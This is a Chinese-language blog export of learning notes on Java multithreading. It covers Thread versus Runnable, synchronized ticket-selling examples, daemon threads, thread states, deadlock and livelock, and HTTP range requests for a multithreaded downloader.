    <content><![CDATA[<h4 id="多线程相关概念"><a href="#多线程相关概念" class="headerlink" title="多线程相关概念"></a>多线程相关概念</h4><p>并发:同一个时刻,多个任务交替执行,造成一种貌似同时的错觉,简单的说,单核CPU实现的多任务就是并发</p>
<p>并行:同一个时刻,多个任务同时执行,多核CPU可以实现并行</p>
<h4 id="两种实现多线程方式的对比分析"><a href="#两种实现多线程方式的对比分析" class="headerlink" title="两种实现多线程方式的对比分析"></a>两种实现多线程方式的对比分析</h4><p>直接继承Thread类和实现Runnable接口都能实现多线程,具体有什么区别呢</p>
<p>1.从java的设计来看,通过继承Thread或者实现Runnable接口来创建线程本质上都没有区别,Thread类本身就实现了Runnable接口</p>
<p>2.实现Runnable接口方式更加适合多个线程共享一个资源的情况,并且避免了单继承的限制</p>
<h4 id="直接继承Thread"><a href="#直接继承Thread" class="headerlink" title="直接继承Thread"></a>直接继承Thread</h4><p>通过两段代码来对比一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketWindow</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tickies=<span class="number">100</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//重写run方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tickies&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                Thread th= Thread.currentThread();<span class="comment">//获取当前线程</span></span><br><span class="line">                String th_name=th.getName();<span class="comment">//获取当前线程名称</span></span><br><span class="line">                System.out.println(th_name+<span class="string">&quot;正在发售&quot;</span>+tickies--+<span class="string">&quot;张票&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223233326400.png" alt="image-20211223233326400"></p>
<p>由运行结果可知,当前每个线程处于”各卖各的票”的情况,对tickies没有实现共享</p>
<h5 id="为什么不调用run方法而调用start方法"><a href="#为什么不调用run方法而调用start方法" class="headerlink" title="为什么不调用run方法而调用start方法?"></a>为什么不调用run方法而调用start方法?</h5><p>因为run方法就只是一个普通的方法,没有真正的启动一个线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">    start0();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">start0</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//start0()是本地方法(native),是JVM调用,底层是c/c++实现</span></span><br><span class="line"><span class="comment">//真正实现多线程的效果,是start0()方法</span></span><br></pre></td></tr></table></figure>

<p><strong>start()方法调用start0()方法后,该线程并不一定会立刻执行,只是将线程变成了可运行状态,具体什么时候执行,取决于cpu,由cpu统一调度</strong></p>
<h4 id="实现Runnable接口"><a href="#实现Runnable接口" class="headerlink" title="实现Runnable接口"></a>实现Runnable接口</h4><h5 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h5><p><span id="example">例子</span></p>
<p>该方法底层使用了一个设计模式<strong>线程代理模式</strong>,接下来用代码进行模拟,代码和真正有差别,但是原理一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">proxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Tiger tiger=<span class="keyword">new</span> Tiger();<span class="comment">//Tiger类实现了Runnable接口</span></span><br><span class="line">        ThreadProxy threadProxy = <span class="keyword">new</span> ThreadProxy(tiger);<span class="comment">//为什么能把tiger放进去,因为tiger实现了Runnable</span></span><br><span class="line">        threadProxy.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span> <span class="keyword">extends</span> <span class="title">Animal</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老虎嗷嗷叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadProxy</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Runnable target =<span class="keyword">null</span>;<span class="comment">//类型是Runnable的属性</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(target!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            target.run();<span class="comment">//动态绑定,最后调用的还是tiger的run</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadProxy</span><span class="params">(Runnable target)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target=target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        start0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start0</span><span class="params">()</span></span>&#123;</span><br><span class="line">        run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">总的来说就是,Tiger没有start方法,但是通过实现Runnable接口,就可以通过Runnable做中间代理从而使用Runnable中的start方法来调用Tiger的run方法实现线程的启动</span><br></pre></td></tr></table></figure>

<p>在通常的开发当中，一般会选择实现Runnable接口，原因有二：<br>1、避免单继承的局限，在Java当中一个类可以实现多个接口，但只能继承一个类<br>2、适合资源的共享</p>
<p>缺点:编程多一层对象包装,如果线程有执行结果是不可以直接返回的</p>
<p><span id="sell">售票程序</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">         TicketWindow tw=<span class="keyword">new</span> TicketWindow();<span class="comment">//创建TicketWindow的实例对象tw</span></span><br><span class="line">        <span class="comment">//这几个线程其实都在执行tw这个对象</span></span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口1&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口2&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口3&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口4&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketWindow</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tickies=<span class="number">100</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tickies&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                Thread th= Thread.currentThread();<span class="comment">//获取当前线程</span></span><br><span class="line">                String th_name=th.getName();<span class="comment">//获取线程名称</span></span><br><span class="line">                System.out.println(th_name+<span class="string">&quot;正在发售&quot;</span>+tickies--+<span class="string">&quot;张票&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可能会出现超卖的现象</span></span><br></pre></td></tr></table></figure>

<img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223234915498.png" alt="image-20211223234915498" style="zoom:67%;" />

<p>这样就不会出现重复卖票的情况,实现了tickies的共享</p>
<p>Runnable接口还可以通过匿名对象来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Runnable target=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;子线程&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Thread t=<span class="keyword">new</span> Thread(target);</span><br><span class="line">        t.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还可以进一步简化上面的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;子线程&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//jdk8后更简化</span></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;子线程2&quot;</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第三种多线程实现方案"><a href="#第三种多线程实现方案" class="headerlink" title="第三种多线程实现方案"></a>第三种多线程实现方案</h4><h5 id="利用Callable-FutureTask接口实现"><a href="#利用Callable-FutureTask接口实现" class="headerlink" title="利用Callable,FutureTask接口实现"></a>利用Callable,FutureTask接口实现</h5><p><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211224011547555.png" alt="image-20211224011547555"></p>
<h5 id="线程的常用方法"><a href="#线程的常用方法" class="headerlink" title="线程的常用方法"></a>线程的常用方法</h5><p>setName //设置线程名称,使之与参数name相同</p>
<p>getName  //返回该线程的名称</p>
<p>常用<code>Thread.currentThread().getName()</code></p>
<p>start //使该线程开始执行,java虚拟机底层调用该线程的start0方法</p>
<p>run //调用线程对象run方法</p>
<p>setPriority //更改线程优先级</p>
<p>getPriority //获取线程的优先级</p>
<p>sleep //在指定的毫秒数内让当前正在执行的线程休眠</p>
<p>interrupt //中断线程,但是并没有真正结束线程,往往是中断休眠sleep,转而执行catch中的语句</p>
<p>yield //是Thread的静态方法,直接<code>Thread.yield()</code>调用即可线程的礼让,让出cpu,让其他线程执行,但让出的时间不确定,所以也不一定礼让成功</p>
<p>join //线程的插队.插队的线程一旦插队成功,则肯定先执行完插入的线程所有的任务</p>
<p>案例:创建一个子线程,每隔1s输出hello,输出20次,主线程每隔一秒,输出hi,输出20次,要求:两个完成同时执行,当主线程输出5次后,就让子线程运行完毕,主线程再继续</p>
<h5 id="用户线程和守护线程"><a href="#用户线程和守护线程" class="headerlink" title="用户线程和守护线程"></a>用户线程和守护线程</h5><p>1.用户线程:也叫工作线程,当线程的任务执行完或通知方式结束</p>
<p>2.守护线程:一般是为工作线程服务的,当所有的用户线程结束,守护线程自动结束</p>
<p>3.常见的守护线程:垃圾回收机制</p>
<h5 id="如何把一个子线程设置为守护线程"><a href="#如何把一个子线程设置为守护线程" class="headerlink" title="如何把一个子线程设置为守护线程"></a>如何把一个子线程设置为守护线程</h5><p><code>myDaemonThread.setDaemon(true)</code>就可以把一个子线程设置为守护线程,主线程结束 它也结束</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyDaemonThread myDaemonThread=<span class="keyword">new</span> MyDaemonThread();</span><br><span class="line">        myDaemonThread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">        myDaemonThread.start();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;主线程运行中&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDaemonThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;子线程运行中&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主线程结束后,子线程也会结束</p>
<h5 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h5><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211225234147135.png" style="zoom: 80%;" />

<h4 id="线程同步机制"><a href="#线程同步机制" class="headerlink" title="线程同步机制"></a>线程同步机制</h4><p>在多线程编程中,一些敏感数据不允许被多个线程同时访问,此时就使用同步访问技术,保证数据在任何统一时刻,最多有一个线程访问,以保证数据的完整性</p>
<p>也可以这样理解:线程同步,即当有一个线程在对内存进行操作时,其他线程都不可以对这个内存地址进行操作,知道该线程完成操作,其他线程才能对该内存地址进行操作</p>
<h5 id="同步具体方法"><a href="#同步具体方法" class="headerlink" title="同步具体方法"></a>同步具体方法</h5><p>1.同步代码块</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(对象)&#123;<span class="comment">//得到对象的锁,才能操作同步代码</span></span><br><span class="line">	<span class="comment">//需要被同步的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.synchronized还可以放在方法声明中,表示整个方法为同步方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">	<span class="comment">//需要被同步的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.如何理解</p>
<p>就好像上厕所,A上厕所关上门(上锁),完事出来后(解锁),那么其他人就可以再使用厕所了</p>
<p>例子</p>
<p>之前的售票窗口程序,通过继承Runnable接口,虽然实现了票数的共享,但是售票顺序是乱的</p>
<p><a href="#sell">售票窗口程序</a></p>
<p>通过线程同步,就可以实现每次只卖一张票,也就是每次只允许一个线程访问tickies变量并执行,这样还可以防止超卖现象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">         TicketWindow tw=<span class="keyword">new</span> TicketWindow();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口1&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口2&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口3&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口4&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketWindow</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tickies=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> loop=<span class="keyword">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(tickies&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                Thread th= Thread.currentThread();<span class="comment">//获取当前线程</span></span><br><span class="line">                String th_name=th.getName();<span class="comment">//获取线程名称</span></span><br><span class="line">                System.out.println(th_name+<span class="string">&quot;正在发售&quot;</span>+tickies--+<span class="string">&quot;张票&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                loop=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(loop)&#123;</span><br><span class="line">            sell();<span class="comment">//sell是一种同步方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由运行结果可知,票按照tickies大小逐次递减卖出,就是不知道为啥,每次只有一到两个线程能抢到cpu资源并且执行</p>
<p><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211226000540093.png" alt="image-20211226000540093"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>java多线程下载器</title>
    <url>/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>记录一些<a href="https://github.com/bluesatchel/MultiThreadDownloader">java多线程下载器</a>学习过程中遇到的问题和解决方法</p>
<h3 id="断点续传实现"><a href="#断点续传实现" class="headerlink" title="断点续传实现"></a>断点续传实现</h3><h4 id="RandomAccessFile类"><a href="#RandomAccessFile类" class="headerlink" title="RandomAccessFile类"></a>RandomAccessFile类</h4><p>RandomAccessFile支持”随机访问”的方式，程序可以直接跳转到文件的任意地方来<strong>读写</strong>数据。</p>
<ol>
<li>RandomAccessFile<strong>可以自由访问文件的任意位置</strong>。</li>
<li>RandomAccessFile<strong>允许自由定位文件记录指针</strong>。</li>
<li>RandomAccessFile<strong>只能读写文件</strong>而不是流。</li>
</ol>
<p>使用<code>accessFile.seek(accessFile.length());</code>方法将指针移动到文件的末尾</p>
<p>同时再结合HTTP协议中关于文件的一个请求头<code>Content-Range </code>来实现从某个字节到某个字节之间的文件数据的获取即可实现简单的http断点续传功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HttpURLConnection <span class="title">getHttpURLConnection</span><span class="params">(String url,<span class="keyword">long</span> startPos,<span class="keyword">long</span> endPos)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        HttpURLConnection httpURLConnection = getHttpURLConnection(url);</span><br><span class="line">        log.info(<span class="string">&quot;下载的区间是:&#123;&#125;--&#123;&#125;&quot;</span>,startPos,endPos);</span><br><span class="line">      <span class="keyword">if</span>(endPos!=<span class="number">0</span>)&#123;</span><br><span class="line">          httpURLConnection.setRequestProperty(<span class="string">&quot;RANGE&quot;</span>,<span class="string">&quot;bytes=&quot;</span>+startPos+<span class="string">&quot;-&quot;</span>+endPos);</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="comment">//最后一块只需要传入开始的字节位置即可</span></span><br><span class="line">          httpURLConnection.setRequestProperty(<span class="string">&quot;RANGE&quot;</span>,<span class="string">&quot;bytes=&quot;</span>+startPos+<span class="string">&quot;-&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> httpURLConnection;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220901175702361.png" alt="image-20220901175702361"></p>
<h3 id="下载信息的获取"><a href="#下载信息的获取" class="headerlink" title="下载信息的获取"></a>下载信息的获取</h3><p>在多个线程同时进行下载时,需要实时获取下载的进度</p>
<p>例如:已经下载的文件大小数据,它需要被各个线程按照自己已经下载的数据大小实时更新</p>
<p>有几种选择:</p>
<ul>
<li>原子类</li>
<li>LOCK锁</li>
<li>Synchronized内部锁</li>
</ul>
<p>在这里综合考量下,使用原子类更为方便</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//本地已下载文件的大小，</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> LongAdder finishedSize=<span class="keyword">new</span> LongAdder();</span><br></pre></td></tr></table></figure>

<p>原因如下:</p>
<p>​    如果使用synchronized内部锁,一般直接锁的是对象,并且还需要向外暴露一个同步方法或者包含同步代码块的方法给各个线程使用</p>
<p>​    如果使用LOCK锁也有同样的麻烦,这里只是简单的一个对象中属性的操作,使用原子类无疑是粒度最小的</p>
<p>接着单独开启一个线程,让其按照固定的时间去检测已经下载的文件的大小<code>finishedSize</code>属性,并在控制台做出输出即可</p>
<p>这里使用<code>Executors.newScheduledThreadPool(1);</code>线程池最佳,使用其中的<code>scheduledExecutorService.scheduleAtFixedRate</code>方法添加任务进去即可</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>java多线程学习记录</title>
    <url>/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="多线程学习记录"><a href="#多线程学习记录" class="headerlink" title="多线程学习记录"></a>多线程学习记录</h1><h2 id="1-线程概述"><a href="#1-线程概述" class="headerlink" title="1.线程概述"></a>1.线程概述</h2><h3 id="线程的常用方法"><a href="#线程的常用方法" class="headerlink" title="线程的常用方法"></a>线程的常用方法</h3><h5 id="currentThread方法"><a href="#currentThread方法" class="headerlink" title="currentThread方法"></a>currentThread方法</h5><p>java中的任何一段代码都是执行在某个线程当中的,执行当前代码的线程就是 当前线程</p>
<p>同一段代码可能被不用的线程执行,因此当前线程是相对的,Thread.currentThread()方法的返回值是在代码实际运行时候的</p>
<p>大概来说就是调用某个方法的线程就是其currentThread()</p>
<h5 id="isAlive"><a href="#isAlive" class="headerlink" title="isAlive()"></a>isAlive()</h5><p>判断当前线程是否处于活动状态(线程已启动且尚未终止)</p>
<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><p>让当前线程休眠指定的毫秒数</p>
<h5 id="getId"><a href="#getId" class="headerlink" title="getId()"></a>getId()</h5><p>返回线程的唯一编号</p>
<h5 id="yield"><a href="#yield" class="headerlink" title="yield()"></a>yield()</h5><p>作用是放弃当前的cpu资源</p>
<h5 id="setPriority-num"><a href="#setPriority-num" class="headerlink" title="setPriority(num)"></a>setPriority(num)</h5><p>1&lt;=num&lt;=10</p>
<p>本质上是给线程调度器一个提示信息,以便于调度器决定先调度哪些线程,不能完全保证优先级高的先运行</p>
<h5 id="interrupt"><a href="#interrupt" class="headerlink" title="interrupt()"></a>interrupt()</h5><p>仅仅是跟线程打一个中断标志</p>
<h5 id="setDaemon"><a href="#setDaemon" class="headerlink" title="setDaemon()"></a>setDaemon()</h5><p>java中的线程分为用户线程与守护线程</p>
<p>守护线程是为其他线程提供服务的线程,如GC就是一个典型的守护线程</p>
<p>守护线程不能单独运行,当JVM中没有其他用户线程,只有守护线程时,守护线程会自动销毁,jvm会退出</p>
<p><strong>启动</strong>之前就设置为守护线程</p>
<h3 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h3><p>可以通过<code>getState()</code>方法来获取是Thread.State枚举类型定义的,有以下几种:</p>
<table>
<thead>
<tr>
<th>Thread.State的值</th>
<th>具体含义</th>
</tr>
</thead>
<tbody><tr>
<td>NEW</td>
<td>创建了线程对象但还没有启动</td>
</tr>
<tr>
<td>RUNNABLE</td>
<td>它是一个复合状态,包含READY和RUNNING两个状态,READY表示可以被调度器调度从而使它处于RUNNING状态</td>
</tr>
<tr>
<td>BLOCKED</td>
<td>阻塞状态,线程发起阻塞的I/O操作,或者申请由其他线程占用的独占资源,线程会转换为BLOCKED阻塞状态,处于阻塞状态的线程不会占用CPU资源,当阻塞I/O操作执行完,或者线程获得了由其申请的资源,线程就可以转换为RUNNABLE状态</td>
</tr>
<tr>
<td>WAITING</td>
<td>线程执行了Object.wait方法,或者Thread.join方法,执行Object.notify方法或者加入的线程执行完毕,就会转换为RUNNABLE状态</td>
</tr>
<tr>
<td>TIMED_WAITING</td>
<td>一般调用Thread.sleep或者Object.wait()方法进入,与WAITING有点像,但是这个状态如果超过指定的时间范围,就会自动转换为RUNNABLE</td>
</tr>
<tr>
<td>TERMINATED</td>
<td>线程结束,处于终止状态</td>
</tr>
</tbody></table>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220805135545694.png" alt="image-20220805135545694"></p>
<h3 id="多线程存在的问题与风险"><a href="#多线程存在的问题与风险" class="headerlink" title="多线程存在的问题与风险"></a>多线程存在的问题与风险</h3><h4 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h4><p>多线程共享数据时,如果没有采取正确的并发访问控制措施,就可能会产生数据一致性问题,如读脏数据(过期的数据),如丢失数据更新</p>
<h4 id="线程活性"><a href="#线程活性" class="headerlink" title="线程活性"></a>线程活性</h4><p>由于程序自身的缺陷或者由资源稀缺性导致线程一直处于非RUNNABLE状态,这就是线程活性问题,常见的活性故障有以下几种</p>
<h5 id="死锁-Deadlock"><a href="#死锁-Deadlock" class="headerlink" title="死锁(Deadlock)"></a>死锁(Deadlock)</h5><p>最简单的例子是：线程 A 占有一号锁，正在请求二号锁，且线程 B 占有二号锁，正在请求一号锁，A、B 线程互相等待对方释放锁，进入了无线等待的状态。</p>
<h5 id="锁死-Lockout"><a href="#锁死-Lockout" class="headerlink" title="锁死(Lockout)"></a>锁死(Lockout)</h5><p>等待线程由于唤醒其所需的条件永远无法成立，或者其他线程无法唤醒这个线程而一直处于非运行状态（线程并未终止）导致其任务 一直无法进展</p>
<p><strong>类似于睡美人故事中王子挂了</strong></p>
<h5 id="活锁-Livelock"><a href="#活锁-Livelock" class="headerlink" title="活锁(Livelock)"></a>活锁(Livelock)</h5><p>活锁是指正在执行的线程或进程没有发生阻塞，但由于某些条件没有满足，导致反复重试-失败-重试-失败的过程。与死锁最大的区别在于：活锁状态的线程或进程是一直处于运行状态的，在失败中不断重试，重试中不断失败，一直处于所谓的“活”态，不会停止。</p>
